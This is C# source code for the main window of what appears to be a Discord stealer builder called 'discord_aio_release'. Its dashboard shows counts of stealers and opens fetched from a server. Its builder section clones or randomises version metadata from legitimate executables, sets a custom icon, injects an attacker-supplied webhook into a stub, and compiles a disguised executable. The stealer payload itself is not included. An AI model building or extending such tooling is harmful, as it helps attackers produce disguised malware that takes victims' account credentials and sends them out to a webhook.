using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Animation;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Net.Sockets;
using System.ComponentModel;
using System.Net.Http.Headers;
using Newtonsoft.Json.Linq;

namespace discord_aio_release
{
    public partial class MainWindow : Window
    {
        private protected string _serializedToken { get; set; }
        private protected string _DP { get; set; }
        private System.Windows.Threading.DispatcherTimer _timer;
        public MainWindow(string _v, string hwid, string serializedToken, string _DAIO)
        {
            InitializeComponent();
            settings_shadow.Opacity = 0;
            builder_shadow.Opacity = 0;
            builder_site.Opacity = 0;
            version_label.Content = _v + " " + hwid.ToUpper();
            username_label.Content = Environment.UserName;
            _serializedToken = serializedToken;
            _DP = _DAIO;
            WebHandler();
            this.metadata = new Metadata(this.ranChars);
            RefTick();
            _timer = new System.Windows.Threading.DispatcherTimer();
            _timer.Interval = TimeSpan.FromMinutes(15);
            _timer.Tick += tTick;
            _timer.Start();
        }

        private readonly Metadata metadata;
        private readonly RandomCharacters ranChars;
        private string Title { get; set; }
        private string Description { get; set; }
        private string Product { get; set; }
        private string Company { get; set; }
        private string Copyright { get; set; }
        private string Trademark { get; set; }
        private string MajorVersion { get; set; }
        private string MinorVersion { get; set; }
        private string BuildPart { get; set; }
        private string PrivatePart { get; set; }

        private async void RefTick()
        {
            HttpClient _client = new HttpClient();
            _client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", _serializedToken);
            HttpResponseMessage response = await _client.GetAsync("APIURL");
            response.EnsureSuccessStatusCode();
            string resBody = await response.Content.ReadAsStringAsync();
            JObject jsonObj = JObject.Parse(resBody);
            users_count.Content = jsonObj["total_Users"].ToString();
            stealers_count1.Content = jsonObj["total_Stealers"].ToString();
            opens_count.Content = jsonObj["total_Opens"].ToString();
            active_count.Content = jsonObj["active_Users"].ToString();
        }

        private async void tTick(object sender, EventArgs e)
        {
            RefTick();
        }

        private async void WebHandler()
        {
            string warning_url = "WARNINGURL";
            using (HttpClient client = new HttpClient())
            {
                // Warning logic
                try
                {
                    HttpResponseMessage response = await client.GetAsync(warning_url);
                    string responseString = await response.Content.ReadAsStringAsync();

                    if (responseString == "")
                        warning.Opacity = 0;

                    warning_label.Content = responseString;
                }
                catch 
                {
                    warning_label.Content = "An error occured. Please, contact the developers.";
                }

                // User avatar logic (simple as for no accounts now)
                try
                {
                    var img = new Image();
                    string iURL = "AVATARURL"; // Make logic to retrieve image by login name

                    BitmapImage bitmap = new BitmapImage();
                    bitmap.BeginInit();
                    bitmap.UriSource = new Uri(iURL, UriKind.Absolute);
                    bitmap.EndInit();

                    user_avatar.ImageSource = bitmap;
                }
                catch { }
            }
        }

        // Buttons animation
        DoubleAnimation anim = new DoubleAnimation
        {
            From = 0.1,
            To = 1,
            Duration = new Duration(TimeSpan.FromSeconds(0.5)),
            AutoReverse = false
        };


        // Dragging the window
        private void Window_MouseDown(object sender, MouseButtonEventArgs e)
        {
            if (e.ChangedButton == MouseButton.Left)
                this.DragMove();
        }

        // Dashboard button
        private void dashboard_button_Click(object sender, RoutedEventArgs e)
        {
            builder_image.Source = this.FindResource("dToolDrawingImageEEE") as ImageSource;
            builder_shadow.Opacity = 0;
            builder_site.Opacity = 0;
            settings_image.Source = this.FindResource("dSetsDrawingImageEEE") as ImageSource;
            settings_shadow.Opacity = 0;

            dashboard_image.BeginAnimation(OpacityProperty, anim);
            dashboard_image.Source = this.FindResource("dashboard_colored") as ImageSource;
            dashboard_shadow.Opacity = 1;
            dashboard_site.Opacity = 1;
        }

        // Builder button
        private void builder_button_Click(object sender, RoutedEventArgs e)
        {
            dashboard_image.Source = this.FindResource("dashboard_ncolored") as ImageSource;
            dashboard_shadow.Opacity = 0;
            dashboard_site.Opacity = 0;
            settings_image.Source = this.FindResource("dSetsDrawingImageEEE") as ImageSource;
            settings_shadow.Opacity = 0;

            builder_image.BeginAnimation(OpacityProperty, anim);
            builder_image.Source = this.FindResource("dToolDrawingImage") as ImageSource;
            builder_shadow.Opacity = 1;
            builder_site.Opacity = 1;
        }

        // Settings button
        private void settings_button_Click(object sender, RoutedEventArgs e)
        {
            dashboard_image.Source = this.FindResource("dashboard_ncolored") as ImageSource;
            dashboard_shadow.Opacity = 0;
            dashboard_site.Opacity = 0;
            builder_image.Source = this.FindResource("dToolDrawingImageEEE") as ImageSource;
            builder_shadow.Opacity = 0;
            builder_site.Opacity = 0;

            settings_image.BeginAnimation(OpacityProperty, anim);
            settings_image.Source = this.FindResource("dSetsDrawingImage") as ImageSource;
            settings_shadow.Opacity = 1;
        }

        // Exit button
        private void exit_button_Click(object sender, RoutedEventArgs e)
        {
            Application.Current.Shutdown();
        }

        // Webhook checker
        private void webhook_button_Click(object sender, RoutedEventArgs e)
        {
            if (!String.IsNullOrEmpty(webhook_input.Text) || !String.IsNullOrWhiteSpace(webhook_input.Text))
            {
                try
                {
                    string wh_ = new WebClient().DownloadString(webhook_input.Text);
                    MessageBox.Show("valid");
                }
                catch { MessageBox.Show("not valid"); }
            }
        }

        private void generate_button_Click(object sender, RoutedEventArgs e)
        {
            FileMetadata meta = metadata.randomMetadata();
            Title = meta.Title;
            Description = meta.Description;
            Product = meta.Product;
            Company = meta.Company;
            Copyright = meta.Copyright;
            Trademark = meta.Trademark;
            MajorVersion = meta.MajorVersion;
            MinorVersion = meta.MinorVersion;
            BuildPart = meta.BuildPart;
            PrivatePart = meta.PrivatePart;

            metadata_label.Content = Description;
        }

        private void clone_button_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                OpenFileDialog cloneDialog = new OpenFileDialog();
                cloneDialog.Filter = "Executable (*.exe)|*.exe";

                bool? dialogResult = cloneDialog.ShowDialog();
                if (dialogResult == true)
                {
                    string path = System.IO.Path.GetFullPath(cloneDialog.FileName);

                    FileVersionInfo info = FileVersionInfo.GetVersionInfo(path);

                    Title = info.OriginalFilename;
                    Description = info.FileDescription;
                    Product = info.ProductName;
                    Company = info.CompanyName;
                    Copyright = info.LegalCopyright;
                    Trademark = info.LegalTrademarks;
                    MajorVersion = info.FileMajorPart.ToString();
                    MinorVersion = info.FileMinorPart.ToString();
                    BuildPart = info.FileBuildPart.ToString();
                    PrivatePart = info.FilePrivatePart.ToString();
                }

                if (Description == "")
                    metadata_label.Content = Product;
                else
                    metadata_label.Content = Description;
            }
            catch {}

        }

        private void icon_button_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                OpenFileDialog iconDialog = new OpenFileDialog();
                iconDialog.Title = "Select icon";
                iconDialog.Filter = "Icon (*.ico)|*.ico";

                bool? dialogResult = iconDialog.ShowDialog();
                if (dialogResult == true)
                {
                    icon_label.Content = iconDialog.FileName;
                }
            }
            catch { }
        }

        private async void build_button_Click(object sender, RoutedEventArgs e)
        {
            if (!(metadata_label.Content.ToString() == "None") && !string.IsNullOrEmpty(metadata_label.Content.ToString()))
            {
                try
                {
                    SaveFileDialog builder = new SaveFileDialog();
                    builder.Filter = "Executable (*.exe)|*.exe";

                    bool? builderResult = builder.ShowDialog();
                    if (builderResult == true)
                    {
                        string iconLabel = icon_label.Content.ToString();
                        string appIcon = "none";
                        if (iconLabel != "None" && !string.IsNullOrEmpty(iconLabel))
                            appIcon = iconLabel;

                        if (File.Exists(System.IO.Path.Combine(_DP, "stub.cs")))
                            File.Delete(System.IO.Path.Combine(_DP, "stub.cs"));

                        string main_sc = File.ReadAllText(System.IO.Path.Combine(_DP, "Program.cs"));
                        main_sc = main_sc.Replace("%WEBHOOK%", webhook_input.Text); // Changing the webhook

                        File.WriteAllText(System.IO.Path.Combine(_DP, "stub.cs"), main_sc);

                        string arguments = $"{_serializedToken} {builder.FileName} {appIcon}";
                        Process.Start(_DP + "\\daioCompiler.exe", arguments);
                    }
                }
                catch { }
            }
        }
    }
}
